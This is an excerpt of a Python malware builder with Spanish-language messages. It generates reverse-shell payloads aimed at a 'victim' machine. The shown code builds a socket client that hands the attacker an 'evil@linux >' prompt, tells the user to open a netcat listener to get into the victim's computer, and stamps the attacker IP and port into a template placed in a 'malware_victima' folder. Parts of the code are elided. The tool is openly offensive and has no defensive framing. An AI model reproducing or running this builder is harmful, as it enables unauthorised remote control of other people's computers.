...
path_autoshell = os.getcwd()+ '/extras/autoshell.sh'
path_plantilla = os.getcwd()+ '/extras/plantilla.py'
path_malware = os.getcwd()+ '/malware_victima/'
path_extras = os.getcwd()+ '/extras/'
...
if numero == 1: 
   ...
   viruspy = "import socket\n"\
             ...
             "   cliente.send(\"evil@linux > \".encode(\"ascii\"))\n"\
             "   while True:\n"\
...
if numero == 2:
   ...
   if option_listen == "Y":
     ...
     print("Sin listener no puedo entrar al equipo victima :(")
     print("Puede poner el comando ["+ azul +""+ negrita +"nc -nlvp PUERTO ESCOGIDO"+ fin +"] para abrir un listener.")
...
if numero == 3:
    ...
    os.system('cp '+ path_plantilla +' '+ path_extras +''+ name_malware +'.py')
    
    with open(""+ path_extras +""+ name_malware +".py", "rt")as f:
      x = f.read()

    with open(""+ path_extras +""+ name_malware +".py", "wt")as f:
      x = x.replace("ip", ""+ ip +"")
      x = x.replace("puerto", ""+ puerto +"")
      f.write(x)
    os.system('mv '+ path_extras +''+ name_malware +'.py '+ path_malware +'')
